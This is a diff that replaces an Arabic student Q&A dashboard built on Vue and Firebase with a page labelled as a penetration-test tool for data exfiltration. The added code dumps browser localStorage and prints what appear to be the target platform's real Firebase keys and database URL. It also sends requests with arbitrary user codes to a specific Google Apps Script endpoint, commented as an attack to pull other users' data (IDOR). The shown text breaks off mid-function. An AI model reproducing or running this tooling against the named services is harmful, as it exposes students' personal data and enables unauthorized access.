@@ -1,852 +1,152 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl" class="dark">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة شاتي Q&A - الإصدار المطور</title> 
-
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
-    <script src="https://unpkg.com/@phosphor-icons/web"></script>
-    
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
-
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    
-    <script>
-        // --- 1. Global Constants & Setup (Optimized for Readability) ---
-        const STUDENT_CODE_KEY = "activeCode";
-        const CURRENT_STUDENT_CODE = localStorage.getItem(STUDENT_CODE_KEY);
-        const CURRENT_STUDENT_NAME = localStorage.getItem('studentName') || 'طالب'; 
-        const STUDENT_SECTION = localStorage.getItem('studentSection') || 'عام';
-        
-        const CODES_REF_PATH = 'approvedStudents';
-        const QUESTIONS_REF_PATH = 'questions'; 
-        const NOTIFICATIONS_REF_PATH = 'notifications';
-        
-        // ⚠️ التحقق الأمني الأساسي (Cybersecurity Check)
-        if (!CURRENT_STUDENT_CODE || !STUDENT_SECTION) {
-            console.warn("⚠️ محاولة دخول غير مصرح بها.");
-            window.location.href = 'index.html'; 
-        }
-
-        // 💡 Tailwind Config (Updated Colors for Modern Look)
-        window.tailwind.config = {
-            darkMode: 'class',
-            theme: {
-                extend: {
-                    colors: {
-                        'bg-main': '#0A131F',     // Dark Navy/Blue
-                        'bg-card': '#142034',     // Slightly Lighter Navy
-                        'accent': '#00A86B',      // Cyber Green Accent
-                        'text-primary': '#E6F0E8', 
-                        'like': '#00C74B', 
-                        'dislike': '#FF4D4D', 
-                        'mention': '#FFC300', 
-                    },
-                    fontFamily: { sans: ['Cairo', 'sans-serif'] }
-                }
-            }
-        };
-
-        window.toggleTheme = (theme) => {
-            if (theme === 'light') {
-                document.documentElement.classList.remove('dark');
-                localStorage.setItem('theme', 'light');
-            } else {
-                document.documentElement.classList.add('dark');
-                localStorage.setItem('theme', 'dark');
-            }
-        };
-
-        const savedTheme = localStorage.getItem('theme') || 'dark';
-        window.toggleTheme(savedTheme);
-
-        // --- 2. Helper Functions (Cleaner Code) ---
-
-        /** * 🚨 أحدثت عليها تعديل عشان الـ Logic يكون أنظف في الـ Reaction
-         * @param {string} recipientCode - كود الطالب المستقبل.
-         */
-        async function createNotification(recipientCode, senderCode, type, refId, refText, isReply = false) {
-            if (recipientCode === senderCode) return; 
-            
-            // عشان نمنع إشعارات اللايك للدسلايك والعكس
-            if (type === 'dislike') return; 
-
-            const newNotifRef = firebase.database().ref(`${NOTIFICATIONS_REF_PATH}/${recipientCode}`).push();
-            
-            newNotifRef.set({
-                senderCode: senderCode,
-                type: type, 
-                refId: refId,
-                refText: refText.substring(0, 50) + '...',
-                isReply: isReply,
-                timestamp: firebase.database.ServerValue.TIMESTAMP,
-                read: false
-            });
-        }
-        
-        function parseMentions(text) {
-            const regex = /@(\d{6})/g; 
-            const mentions = [];
-            let match;
-            while ((match = regex.exec(text)) !== null) {
-                mentions.push(match[1]);
-            }
-            return mentions;
-        }
-
-    </script>
-    
+    <title>Penetration Test Tool | Data Exfiltration</title>
     <style>
-        body { font-family: 'Cairo', sans-serif; transition: background-color 0.3s; }
-        .main-accent { color: var(--accent); }
-        .header-bg { background-color: var(--bg-card); }
-        .active-link { border-right: 3px solid var(--accent); color: var(--accent) !important; font-weight: bold;}
-        .q-card { background-color: var(--bg-card); border-radius: 0.75rem; }
-        .q-card:hover { transform: translateY(-1px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .like-btn.active { color: var(--like); }
-        .dislike-btn.active { color: var(--dislike); }
-        .text-wrap-fix { white-space: normal; word-wrap: break-word; }
-        .accent-bg { background-color: var(--accent); }
-        
-        /* 🚨 Sidebar Styling for the New Layout */
-        .sidebar-item {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            padding: 0.75rem 1rem;
-            transition: background-color 0.2s, color 0.2s;
-            cursor: pointer;
-            border-radius: 0.5rem;
-            color: #9CA3AF; /* Default Gray */
-        }
-        .sidebar-item:hover:not(.active-link) {
-            background-color: #1F2937;
-            color: #E6F0E8;
-        }
-        .sidebar-item.active-link {
-            background-color: rgba(0, 168, 107, 0.1); /* light accent background */
-        }
+        /* (نفس تنسيقات CSS السابقة) */
+        body { font-family: 'Cairo', sans-serif; background: #222; color: #eee; padding: 20px; }
+        .container { max-width: 900px; margin: auto; background: #333; padding: 25px; border-radius: 10px; }
+        h2 { color: #ffcb42; border-bottom: 2px solid #ffcb42; padding-bottom: 10px; margin-bottom: 20px; }
+        h3 { color: #4ade80; margin-top: 25px; }
+        label, button { display: block; margin-top: 15px; }
+        input[type="text"] { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ffcb42; background: #444; color: #fff; }
+        button { background: #4ade80; color: #222; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #37d675; }
+        #results, #localData, #firebaseConfigData { margin-top: 20px; padding: 15px; background: #1a0a3d; border: 1px dashed #ffcb42; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
+        .error { color: #f87171; }
+        .success { color: #4ade80; }
+        .data-title { color: #ffcb42; font-weight: bold; margin-top: 10px; display: block; }
     </style>
 </head>
+<body>
 
-<body class="h-screen overflow-hidden flex">
+<div class="container">
+    <h2>🔬 استخراج البيانات الشامل (Data Exfiltration)</h2>
 
-<div id="dashboard-app" class="flex-1 flex h-full overflow-hidden">
+    <h3>1. سحب وتحليل كل بيانات المتصفح (Local Storage Dump)</h3>
+    <button onclick="dumpLocalStorage()">استخراج وتحليل البيانات المخزنة محلياً</button>
+    <div id="localData"></div>
+
+    <h3>2. فحص API لجلب بيانات مستخدم آخر (اختبار الشيتس)</h3>
+    <label for="testCode">كود للاختبار (استبدال الكود):</label>
+    <input type="text" id="testCode" placeholder="أدخل كود أي مستخدم (لتجربة IDOR)">
+    <button onclick="checkCodeFunction()">إرسال طلب التحقق لـ API الشيتس</button>
+    <div id="results">نتائج فحص API الشيتس ستظهر هنا...</div>
     
-    <aside class="w-64 header-bg shadow-2xl p-6 flex flex-col flex-shrink-0">
-        <h1 class="text-2xl font-extrabold main-accent mb-10">منصة شاتي Q&A</h1>
-        <span class="text-sm text-gray-400 mb-8">مرحبًا، {{ studentName }} ({{ studentCode }})</span>
-
-        <nav class="flex-1 space-y-3">
-            <div @click="currentPage='subjects'" :class="{'active-link': currentPage === 'subjects'}" class="sidebar-item">
-                <i class="ph ph-chalkboard-teacher text-xl"></i>
-                <span>المواد والأقسام</span>
-            </div>
-            <div @click="currentPage='notifications'" :class="{'active-link': currentPage === 'notifications'}" class="sidebar-item relative">
-                <i class="ph ph-bell text-xl"></i>
-                <span>الإشعارات</span>
-                <span v-if="unreadCount > 0" class="absolute left-3 top-3 bg-red-600 text-white text-xs px-2 py-0.5 rounded-full">{{ unreadCount }}</span>
-            </div>
-            <div @click="currentPage='profile'" :class="{'active-link': currentPage === 'profile'}" class="sidebar-item">
-                <i class="ph ph-user-circle text-xl"></i>
-                <span>صفحتي الشخصية</span>
-            </div>
-            <div @click="currentPage='analytics'" :class="{'active-link': currentPage === 'analytics'}" class="sidebar-item">
-                <i class="ph ph-chart-bar text-xl"></i>
-                <span>إحصائيات المنصة</span>
-            </div>
-        </nav>
-        
-        <div class="mt-auto">
-             <div class="flex justify-between mb-4">
-                <button @click="toggleTheme('dark')" class="text-gray-400 hover:text-text-primary p-2 rounded-full transition-colors" title="Dark Theme">
-                    <i class="ph ph-moon-stars text-xl"></i>
-                </button>
-                <button @click="toggleTheme('light')" class="text-gray-400 hover:text-text-primary p-2 rounded-full transition-colors" title="Light Theme">
-                    <i class="ph ph-sun text-xl"></i>
-                </button>
-            </div>
-            <button @click="logout" class="w-full text-red-500 hover:bg-gray-700/50 flex items-center gap-2 p-2 rounded transition-colors">
-                <i class="ph ph-sign-out text-xl"></i> تسجيل خروج
-            </button>
-        </div>
-    </aside>
-
-    <main class="flex-1 overflow-y-auto p-8 bg-bg-main text-text-primary">
-        
-        <div class="text-gray-500 text-sm mb-6">
-            <span v-if="currentPage !== 'subjects'">
-                <button @click="backToSubjects" class="hover:main-accent">المواد</button>
-            </span>
-            <span v-if="selectedSubject.key && currentPage !== 'subjects'"> / </span>
-            <span v-if="selectedSubject.key && currentPage !== 'chapters'">
-                <button @click="backToChapters" class="hover:main-accent">{{ selectedSubject.name }}</button>
-            </span>
-            <span v-if="selectedChapter && currentPage !== 'chapters'"> / </span>
-            <span v-if="selectedChapter && currentPage === 'questions'" class="main-accent">الفصل {{ selectedChapter }}</span>
-        </div>
-
-        
-        <div v-if="currentPage === 'subjects'">
-            <h2 class="text-3xl font-bold mb-8">📚 قائمة المواد ({{ STUDENT_SECTION }})</h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-                <div v-for="subject in subjects" :key="subject.key" @click="selectSubject(subject)"
-                    class="q-card p-6 rounded-lg cursor-pointer transition-all hover:border-accent border border-bg-card">
-                    <h3 class="text-xl font-bold main-accent">{{ subject.name }}</h3>
-                    <p class="text-gray-400 mt-1">{{ subject.description }}</p>
-                </div>
-            </div>
-        </div>
-
-        <div v-else-if="currentPage === 'chapters'">
-            <h2 class="text-3xl font-bold mb-8 border-b border-gray-700 pb-2">فصول مادة: {{ selectedSubject.name }}</h2>
-            <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
-                <div v-for="i in 5" :key="i" @click="selectChapter(i)"
-                    class="q-card p-4 rounded-lg cursor-pointer text-center transition-all hover:border-accent border border-bg-card">
-                    <i class="ph ph-book-open-text text-2xl main-accent mb-2"></i>
-                    <span class="text-lg font-bold block">الفصل {{ i }}</span>
-                </div>
-            </div>
-        </div>
-
-        <div v-else-if="currentPage === 'questions'">
-            <h2 class="text-3xl font-bold mb-6">{{ selectedSubject.name }} - الفصل {{ selectedChapter }}</h2>
-            
-            <div class="flex justify-between items-center mb-6">
-                <button @click="openNewQuestionModal" class="accent-bg text-white px-5 py-2 rounded-lg font-semibold hover:opacity-90 transition-opacity flex items-center gap-2">
-                    <i class="ph ph-plus-circle text-lg"></i> إضافة سؤال جديد
-                </button>
-                
-                <select class="p-2 rounded bg-bg-card border border-gray-700 text-sm">
-                    <option value="latest">الأحدث (افتراضي)</option>
-                    <option value="hot">الأكثر تفاعلاً (قريباً)</option>
-                    <option value="unanswered">الأسئلة بدون رد (قريباً)</option>
-                </select>
-            </div>
-            
-            <div v-if="questions.length > 0" class="space-y-8">
-                <div v-for="q in questions" :key="q.id" class="q-card p-6 rounded-xl transition-all text-wrap-fix shadow-lg">
-                    <p class="text-sm text-gray-400 mb-2">من: <span class="font-mono main-accent">{{ q.studentCode }}</span> ({{ q.studentName }})</p>
-                    <p class="text-xl font-medium leading-relaxed">{{ q.text }}</p>
-
-                    <div class="mt-5 border-t border-gray-700 pt-4 flex justify-between items-center">
-                        <div class="flex gap-6 items-center">
-                            <button @click="toggleReaction(q.id, null, 'like', q.studentCode)" :class="{'like-btn active': q.userReaction === 'like'}" class="text-gray-500 hover:text-like transition-colors flex items-center gap-1">
-                                <i class="ph ph-thumbs-up text-xl"></i> {{ q.likesCount }}
-                            </button>
-                            <button @click="toggleReaction(q.id, null, 'dislike', q.studentCode)" :class="{'dislike-btn active': q.userReaction === 'dislike'}" class="text-gray-500 hover:text-dislike transition-colors flex items-center gap-1">
-                                <i class="ph ph-thumbs-down text-xl"></i> {{ q.dislikesCount }}
-                            </button>
-                            
-                            <span class="text-sm text-gray-500 flex items-center gap-1">
-                                <i class="ph ph-chat-circle text-lg"></i> {{ q.repliesCount || 0 }} رد
-                            </span>
-                            
-                        </div>
-                        <button @click="showReplies(q)" class="main-accent hover:underline text-sm font-medium flex items-center gap-1">
-                            عرض الردود <i class="ph ph-arrow-down-circle"></i>
-                        </button>
-                    </div>
-                    
-                    <div v-if="q.showReplies" class="mt-6 border-t border-gray-800 pt-5 space-y-4">
-                        <div v-for="r in q.replies" :key="r.id" class="p-4 rounded-lg bg-bg-main border border-gray-700 text-wrap-fix shadow-inner">
-                            <p class="text-xs text-gray-500 mb-2">رد من: <span class="font-mono text-accent">{{ r.studentCode }}</span> <span v-if="r.isBestAnswer" class="text-yellow-500 font-bold ml-2"> (أفضل إجابة ⭐️)</span></p>
-                            <p class="text-base">{{ r.text }}</p>
-                            
-                            <div class="mt-3 flex justify-between items-center">
-                                <div class="flex gap-4 items-center">
-                                    <button @click="toggleReaction(q.id, r.id, 'like', r.studentCode, true)" :class="{'like-btn active': r.userReaction === 'like'}" class="text-gray-500 hover:text-like transition-colors flex items-center gap-1">
-                                        <i class="ph ph-thumbs-up text-md"></i> {{ r.likesCount }}
-                                    </button>
-                                    <button @click="toggleReaction(q.id, r.id, 'dislike', r.studentCode, true)" :class="{'dislike-btn active': r.userReaction === 'dislike'}" class="text-gray-500 hover:text-dislike transition-colors flex items-center gap-1">
-                                        <i class="ph ph-thumbs-down text-md"></i> {{ r.dislikesCount }}
-                                    </button>
-                                </div>
-                                
-                                <button v-if="q.studentCode === studentCode" 
-                                        @click="markBestAnswer(q.id, r.id)"
-                                        :class="{'text-yellow-500': r.isBestAnswer, 'text-gray-600 hover:text-yellow-400': !r.isBestAnswer}"
-                                        class="text-sm font-medium transition-colors">
-                                    <i class="ph ph-star-four-bold text-lg"></i> {{ r.isBestAnswer ? 'تم التحديد' : 'تحديد كأفضل إجابة' }}
-                                </button>
-                            </div>
-                        </div>
-                        <form @submit.prevent="addReply(q)" class="mt-4 flex gap-2">
-                            <input v-model="q.replyText" type="text" placeholder="أضف ردك هنا... (@كود للمنشن)" required
-                                   class="flex-1 p-3 rounded-lg border border-gray-600 focus:ring-accent focus:border-accent bg-gray-800 text-text-primary transition-colors">
-                            <button type="submit" class="accent-bg text-white px-4 py-2 rounded-lg font-semibold hover:opacity-90">نشر</button>
-                        </form>
-                    </div>
-
-                </div>
-            </div>
-            <p v-else class="text-center text-gray-500 p-10 q-card rounded-xl">لا توجد أسئلة في هذا الفصل بعد. كن أول من يسأل!</p>
-        </div>
-
-        <div v-else-if="currentPage === 'notifications'">
-            <h2 class="text-3xl font-bold mb-6 border-b border-gray-700 pb-2">🔔 الإشعارات (آخر التفاعلات)</h2>
-            <div v-if="notifications.length > 0" class="space-y-3">
-                <div v-for="n in notifications" :key="n.id" 
-                    @click="goToNotification(n)"
-                    :class="{'bg-bg-card border-r-4 border-accent shadow-md': !n.read, 'bg-gray-800/50': n.read}"
-                    class="p-4 rounded-lg cursor-pointer transition-all hover:bg-bg-card/80 flex justify-between items-start">
-                    
-                    <p class="mt-1 text-wrap-fix flex-1">
-                        <span class="font-mono main-accent">{{ n.senderCode }}</span> 
-                        <span v-if="n.type === 'like'">أعجب بـ: "{{ n.refText }}"</span>
-                        <span v-else-if="n.type === 'reply'">رد على سؤالك: "{{ n.refText }}"</span>
-                        <span v-else-if="n.type === 'mention'" class="text-mention">ذكرك في: "{{ n.refText }}"</span>
-                    </p>
-                    <span class="text-xs text-gray-400 ml-4 flex-shrink-0">{{ formatTimestamp(n.timestamp) }}</span>
-                </div>
-            </div>
-            <p v-else class="text-center text-gray-500 p-8 q-card rounded-lg">لا توجد إشعارات جديدة.</p>
-        </div>
-
-        <div v-else-if="currentPage === 'profile'">
-            <h2 class="text-3xl font-bold mb-6 border-b border-gray-700 pb-2">👤 صفحتي الشخصية</h2>
-            
-            <div class="q-card p-6 rounded-xl mb-8">
-                <h3 class="text-xl font-bold main-accent mb-4">بيانات الحساب</h3>
-                <p class="text-lg">كود الطالب: <span class="font-mono text-2xl text-red-400">{{ studentCode }}</span></p>
-                <p class="text-lg mt-2">الشعبة: <span class="text-xl font-semibold">{{ STUDENT_SECTION }}</span></p>
-            </div>
-
-            <div class="q-card p-6 rounded-xl mb-8">
-                <h3 class="text-xl font-bold main-accent mb-4">تغيير الاسم المعروض</h3>
-                <form @submit.prevent="updateDisplayName" class="flex gap-4">
-                    <input v-model="newDisplayName" type="text" :placeholder="studentName" required
-                           class="flex-1 p-3 rounded border border-gray-600 focus:ring-accent focus:border-accent bg-gray-800 text-text-primary">
-                    <button type="submit" class="accent-bg text-white px-5 py-2 rounded-lg font-semibold hover:opacity-90">تحديث الاسم</button>
-                </form>
-            </div>
-            
-            <div class="space-y-4">
-                <div class="flex border-b border-gray-700">
-                    <button @click="profileTab = 'myQuestions'" :class="{'active-tab-link': profileTab === 'myQuestions'}" class="p-3 font-medium transition-colors hover:main-accent">أسئلتي ({{ myQuestions.length }})</button>
-                    <button @click="profileTab = 'myReplies'" :class="{'active-tab-link': profileTab === 'myReplies'}" class="p-3 font-medium transition-colors hover:main-accent">ردودي ({{ myReplies.length }})</button>
-                </div>
-                <div class="space-y-4">
-                    <div v-if="profileTab === 'myQuestions'" class="space-y-4">
-                        <div v-for="q in myQuestions" :key="q.id" class="q-card p-4 rounded-lg cursor-pointer hover:bg-gray-800/70" @click="goToQuestion(q)">
-                            <p class="text-lg text-wrap-fix">{{ q.text }}</p>
-                            <span class="text-sm text-gray-500 block mt-1">{{ q.repliesCount || 0 }} رد | {{ q.subjectKey.toUpperCase() }} - فصل {{ q.chapter }}</span>
-                        </div>
-                        <p v-if="myQuestions.length === 0" class="text-center text-gray-500">لم تقم بطرح أي أسئلة بعد.</p>
-                    </div>
-
-                    <div v-if="profileTab === 'myReplies'" class="space-y-4">
-                        <div v-for="r in myReplies" :key="r.id" class="q-card p-4 rounded-lg cursor-pointer hover:bg-gray-800/70" @click="goToReply(r)">
-                            <p class="text-lg text-wrap-fix">{{ r.text }}</p>
-                            <span class="text-sm text-gray-500 block mt-1">على سؤال: "{{ r.questionText.substring(0, 30) }}..." | {{ r.subjectKey.toUpperCase() }} - فصل {{ r.chapter }}</span>
-                        </div>
-                        <p v-if="myReplies.length === 0" class="text-center text-gray-500">لم تقم بإضافة أي ردود بعد.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div v-else-if="currentPage === 'analytics'">
-            <h2 class="text-3xl font-bold mb-6 border-b border-gray-700 pb-2">📊 إحصائيات المنصة</h2>
-            <div class="q-card p-8 text-center text-gray-400">
-                <i class="ph ph-chart-line-up text-6xl main-accent mb-4"></i>
-                <p class="text-xl">جاري بناء لوحة الإحصائيات المتقدمة (Gamification & Moderation Logs).</p>
-                <p class="mt-2">ستظهر هنا تفاعلاتك ونقاطك وإجمالي الأسئلة والردود على مستوى الشعبة.</p>
-            </div>
-        </div>
-
-
-    </main>
+    <h3>3. عرض مفاتيح Firebase (Information Disclosure)</h3>
+    <button onclick="showFirebaseConfig()">عرض مفاتيح Firebase العامة</button>
+    <div id="firebaseConfigData"></div>
     
-    <div v-if="showNewQuestionModal" class="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
-        <div class="q-card p-8 rounded-xl w-full max-w-lg shadow-2xl">
-            <h3 class="text-2xl font-bold main-accent mb-5">أضف سؤالك الجديد</h3>
-            <form @submit.prevent="addNewQuestion">
-                <textarea v-model="newQuestionText" placeholder="اكتب سؤالك هنا... (@كود للمنشن)" required rows="6"
-                          class="w-full p-3 rounded border border-gray-600 focus:ring-accent focus:border-accent bg-gray-800 text-text-primary resize-none"></textarea>
-                <div class="flex justify-end gap-3 mt-4">
-                    <button type="button" @click="showNewQuestionModal = false" class="bg-gray-600 text-white px-4 py-2 rounded-lg font-semibold hover:bg-gray-500 transition-colors">إلغاء</button>
-                    <button type="submit" class="accent-bg text-white px-4 py-2 rounded-lg font-semibold hover:opacity-90 transition-opacity">نشر السؤال</button>
-                </div>
-            </form>
-        </div>
-    </div>
+    <h3>4. تنظيف الجلسة</h3>
+    <button onclick="clearLocalStorage()">مسح كل بيانات Local Storage</button>
+
 </div>
 
 <script>
-// ⚠️ تنفيذ الكود عند تحميل الصفحة بالكامل لضمان تحميل Firebase
-window.onload = function() {
-    const { createApp, ref, reactive, computed, watch } = Vue;
-    
-    // 🚨 التحقق النهائي من تهيئة Firebase
-    if (typeof firebase === 'undefined' || typeof firebase.database === 'undefined') {
-        alert("❌ فشل تحميل مكتبات Firebase! تأكد من اتصال الشبكة.");
-        return; 
+    // ** الثوابت والمفاتيح اللي جبناها من الكود الأصلي **
+    const API = "https://script.google.com/macros/s/AKfycbzIUhokuivKzt88Uzjg1zW0QHRUY_ZVSH6co-gojamtTk-IJxHxBA3GzEz8kauiSVKzZg/exec";
+    const firebaseConfig = {
+        apiKey:"AIzaSyDqkS7udZdgZqKWkw2Wvdx0aWbjU8EfCg8",
+        authDomain:"drosk-622f6.firebaseapp.com",
+        databaseURL:"https://drosk-622f6-default-rtdb.firebaseio.com",
+        projectId:"drosk-622f6",
+        storageBucket:"drosk-622f6.appspot.com",
+        messagingSenderId:"765071631440",
+        appId:"1:765071631440:web:a2305e478babc4534add55",
+        measurementId:"G-2SL3D7TCQE"
+    };
+
+    /**
+     * سحب وعرض كل ما هو مخزن في Local Storage.
+     */
+    function dumpLocalStorage() {
+        const localDataDiv = document.getElementById("localData");
+        localDataDiv.innerHTML = '<span class="data-title">📍 البيانات المخزنة حالياً في المتصفح:</span><br>';
+        
+        let allData = {};
+        let count = 0;
+        
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            let value;
+            try {
+                // محاولة Parse كـ JSON إذا كان user_data مثلاً
+                value = JSON.parse(localStorage.getItem(key));
+            } catch (e) {
+                value = localStorage.getItem(key);
+            }
+            allData[key] = value;
+            count++;
+        }
+
+        if (count > 0) {
+            localDataDiv.innerHTML += JSON.stringify(allData, null, 2);
+            localDataDiv.innerHTML += `<br><br><span class="success">✅ تم استخراج ${count} مفتاح/قيمة بنجاح.</span>`;
+        } else {
+            localDataDiv.innerHTML += '<span class="error">⚠ لا توجد بيانات مخزنة حالياً. سجل دخولك أولاً.</span>';
+        }
     }
-    
-    // --- State Management ---
-    const studentCode = CURRENT_STUDENT_CODE;
-    const studentName = ref(CURRENT_STUDENT_NAME);
-    const studentSection = ref(STUDENT_SECTION); 
-    
-    const db = firebase.database();
-    
-    // Navigation
-    const currentPage = ref('subjects'); 
-    const selectedSubject = reactive({});
-    const selectedChapter = ref(null);
 
-    // Data
-    const questions = ref([]);
-    const allQuestionsData = ref({}); 
-    const notifications = ref([]);
-    const unreadCount = ref(0);
-    
-    // Modals & Inputs
-    const showNewQuestionModal = ref(false);
-    const newQuestionText = ref('');
-    const newDisplayName = ref('');
-    const profileTab = ref('myQuestions');
 
-    // --- Computed Properties & Constants ---
-    
-    const subjectsMap = {
-        'ادبي': [{ key: 'history', name: 'التاريخ', description: 'أسئلة وتلخيصات' }, { key: 'geography', name: 'الجغرافيا', description: 'خرائط ومفاهيم' }, { key: 'arabic', name: 'اللغة العربية', description: 'نحو وبلاغة' }, { key: 'english', name: 'اللغة الإنجليزية', description: 'كلمات وقواعد' }, { key: 'philosophy', name: 'الفلسفة', description: 'أسئلة ومفاهيم' }],
-        'علمي رياضة': [{ key: 'math', name: 'الرياضيات', description: 'مسائل وقوانين' }, { key: 'physics', name: 'الفيزياء', description: 'أسئلة نظرية' }, { key: 'chemistry', name: 'الكيمياء', description: 'معادلات وحسابات' }, { key: 'arabic', name: 'اللغة العربية', description: 'نحو وبلاغة' }, { key: 'english', name: 'اللغة الإنجليزية', description: 'كلمات وقواعد' }],
-        'علمي علوم': [{ key: 'biology', name: 'الأحياء', description: 'رسومات وتفاصيل' }, { key: 'physics', name: 'الفيزياء', description: 'أسئلة نظرية' }, { key: 'chemistry', name: 'الكيمياء', description: 'معادلات وحسابات' }, { key: 'arabic', name: 'اللغة العربية', description: 'نحو وبلاغة' }, { key: 'english', name: 'اللغة الإنجليزية', description: 'كلمات وقواعد' }],
-        'عام': [{ key: 'general', name: 'المواد العامة', description: 'محتوى غير مصنف' }] 
-    };
-    
-    const subjects = computed(() => {
-        return subjectsMap[studentSection.value] || subjectsMap['عام'];
-    });
+    /**
+     * عرض مفاتيح Firebase العامة.
+     */
+    function showFirebaseConfig() {
+        const firebaseConfigDataDiv = document.getElementById("firebaseConfigData");
+        firebaseConfigDataDiv.innerHTML = '<span class="data-title">🔑 مفاتيح Firebase المكشوفة:</span><br>';
+        firebaseConfigDataDiv.innerHTML += JSON.stringify(firebaseConfig, null, 2);
+        firebaseConfigDataDiv.innerHTML += `<br><br><span class="success">⚠️ مفتاح الـ **API Key** مكشوف!</span>`;
+    }
 
-    const myQuestions = computed(() => {
-        const list = Object.values(allQuestionsData.value).filter(q => q.studentCode === studentCode);
-        return list.sort((a, b) => b.timestamp - a.timestamp);
-    });
+    /**
+     * وظيفة اختبار صلاحية الكود عبر API (اختبار IDOR/Sheets).
+     * (نفس الوظيفة السابقة لكن لعرض نتائج API الشيتس).
+     */
+    async function checkCodeFunction() {
+        const resultsDiv = document.getElementById("results");
+        resultsDiv.innerHTML = "جاري إرسال الطلب...<br>";
+        const code = document.getElementById("testCode").value.trim();
+        const device = "Test-Device-ID"; // نستخدم ID ثابت لاختبار الثغرة
 
-    const myReplies = computed(() => {
-        const repliesList = [];
-        Object.values(allQuestionsData.value).forEach(q => {
-            if (q.replies) {
-                Object.values(q.replies).forEach(r => {
-                    if (r.studentCode === studentCode) {
-                        repliesList.push({ 
-                            ...r, 
-                            questionId: q.id, 
-                            questionText: q.text,
-                            subjectKey: q.subjectKey,
-                            chapter: q.chapter
-                        });
-                    }
-                });
-            }
-        });
-        return repliesList.sort((a, b) => b.timestamp - a.timestamp);
-    });
-
-    // --- Utility Methods ---
-
-    const logout = () => {
-        localStorage.clear();
-        window.location.href = 'index.html';
-    };
-
-    const backToSubjects = () => {
-        currentPage.value = 'subjects';
-        selectedSubject.key = null;
-        selectedChapter.value = null;
-        questions.value = [];
-    };
-
-    const backToChapters = () => {
-        currentPage.value = 'chapters';
-        selectedChapter.value = null;
-        questions.value = [];
-    };
-    
-    const formatTimestamp = (timestamp) => {
-        if (!timestamp) return '';
-        return new Date(timestamp).toLocaleString('ar-EG', { dateStyle: 'medium', timeStyle: 'short' });
-    };
-
-    // 🚨 Navigation 
-    const selectSubject = (subject) => {
-        selectedSubject.key = subject.key;
-        selectedSubject.name = subject.name;
-        currentPage.value = 'chapters';
-    };
-
-    const selectChapter = (chapterNum) => {
-        selectedChapter.value = chapterNum;
-        currentPage.value = 'questions';
-        fetchQuestions(); 
-    };
-    
-    // 🚨 Notifications Logic
-    const fetchNotifications = () => {
-        const notifRef = db.ref(`${NOTIFICATIONS_REF_PATH}/${studentCode}`);
-        notifRef.on('value', (snapshot) => {
-            const data = snapshot.val();
-            const notifsArray = [];
-            let unread = 0;
-            
-            if (data) {
-                Object.keys(data).forEach(key => {
-                    notifsArray.push({ id: key, ...data[key] });
-                    if (!data[key].read) unread++;
-                });
-            }
-            
-            notifications.value = notifsArray.sort((a, b) => b.timestamp - a.timestamp);
-            unreadCount.value = unread;
-        });
-    };
-    
-    const markNotificationAsRead = (id) => {
-        db.ref(`${NOTIFICATIONS_REF_PATH}/${studentCode}/${id}`).update({ read: true });
-    };
-    
-    const getSubjectNameByKey = (key, section) => {
-        return subjectsMap[section]?.find(s => s.key === key)?.name || key;
-    };
-    
-    const goToNotification = (notif) => {
-         markNotificationAsRead(notif.id);
-         const qData = allQuestionsData.value[notif.refId];
-         if (qData) {
-             selectedSubject.key = qData.subjectKey;
-             selectedSubject.name = getSubjectNameByKey(qData.subjectKey, qData.section);
-             selectedChapter.value = qData.chapter;
-             currentPage.value = 'questions';
-             // 🚨 هنا هتدخل الـ Logic اللي يفتح الردود مباشرة لو كان الإشعار رد
-             questions.value.find(q => q.id === notif.refId).showReplies = true;
-         } else {
-             alert('تعذر تحديد مكان التفاعل في الوقت الحالي.');
-         }
-    };
-
-    // 🚨 Profile Update
-    const updateDisplayName = async () => {
-        const newName = newDisplayName.value.trim();
-        if (newName.length < 3) {
-            alert('الاسم يجب أن يكون 3 حروف على الأقل.');
+        if (!code) {
+            resultsDiv.innerHTML = "<span class='error'>⚠ لازم تدخل كود عشان أشتغل.</span>";
             return;
         }
-        
+
         try {
-            // تحديث الاسم في قاعدة بيانات الطلاب (Codes)
-            await db.ref(`${CODES_REF_PATH}/${studentCode}`).update({ name: newName });
-            
-            // تحديث الاسم في جميع أسئلة المستخدم القديمة والردود (للتناسق)
-            // ⚠️ هذا الجزء مكلف ويجب تنفيذه كـ Transaction أو كـ Cloud Function في تطبيق حقيقي
-            
-            localStorage.setItem('studentName', newName);
-            studentName.value = newName;
-            newDisplayName.value = '';
-            alert('✅ تم تحديث الاسم بنجاح.');
-        } catch (e) {
-            alert('❌ فشل تحديث الاسم.');
-        }
-    };
+            // الهجوم المباشر على API: نغير الكود لجلب بيانات أي حد تاني
+            const url = `${API}?action=check&code=${encodeURIComponent(code)}&device=${encodeURIComponent(device)}`;
+            const res = await fetch(url);
+            const data = await res.json();
 
-    const goToQuestion = (q) => {
-        selectedSubject.key = q.subjectKey;
-        selectedSubject.name = getSubjectNameByKey(q.subjectKey, q.section);
-        selectChapter(q.chapter);
-    };
-    
-    const goToReply = (r) => {
-        selectedSubject.key = r.subjectKey;
-        selectedSubject.name = getSubjectNameByKey(r.subjectKey, r.section);
-        selectChapter(r.chapter);
-    };
-    
-    // 🚨 Best Answer Logic
-    const markBestAnswer = async (questionId, replyId) => {
